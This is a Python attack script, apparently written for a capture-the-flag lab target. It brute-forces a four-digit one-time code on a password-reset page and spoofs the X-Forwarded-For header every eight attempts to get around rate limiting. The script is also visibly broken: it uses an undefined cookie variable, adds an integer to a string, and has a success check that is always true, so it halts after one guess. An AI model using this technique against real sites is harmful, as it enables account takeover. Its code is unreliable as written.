import requests

ip = 1

header = {"Host": "10.65.154.189:1337",
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Content-Type": "application/x-www-form-urlencoded",
			"Accept-Encoding": "gzip, deflate",
			"Connection": "keep-alive",
			"Upgrade-Insecure-Requests": "1",
			"x-forwarded-for": "127.0.0." + str(ip), 
			"Priority": "u=0, i"
				}
url = "http://10.65.154.189:1337/reset_password.php"
session = requests.Session()
page = session.get(url)
email = "tester@hammer.thm"

def detectPage(session, url,email,headers):
	page = session.get(url)
	if email in page.text:
		print("Travelling to OTP....")
		session.post(url,data={"email": email},headers=headers)

	return "Made to OTP"
	
	
def bruteForce(session,url,headers,ip,email):
	detectPage(session, url,email,headers)
	__trys = 0
	otp_str = "0000"
	
	success = False
	while success != True:
		__header = {"Host": "10.65.154.189:1337",
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Content-Type": "application/x-www-form-urlencoded",
			"Accept-Encoding": "gzip, deflate",
			"Connection": "keep-alive",
			"Cookie": cookie,
			"Upgrade-Insecure-Requests": "1",
			"x-forwarded-for": "127.0.0." + ip, 
			"Priority": "u=0, i"
				}
				
		otp = {"code1":otp_str[0],
			"code2":otp_str[1],
			"code3":otp_str[2],
			"code4":otp_str[3]}
		
		result = session.post(url,data=otp,headers=__header)
		
		__trys += 1
		if __trys == 8:
			ip += 1
			__trys = 0
			
		otp_int = int(otp_str)
		otp_int += 1
		otp_str = str(otp_int).zfill(4)
		
		if "success" or "welcome" in result.text:
			success = True

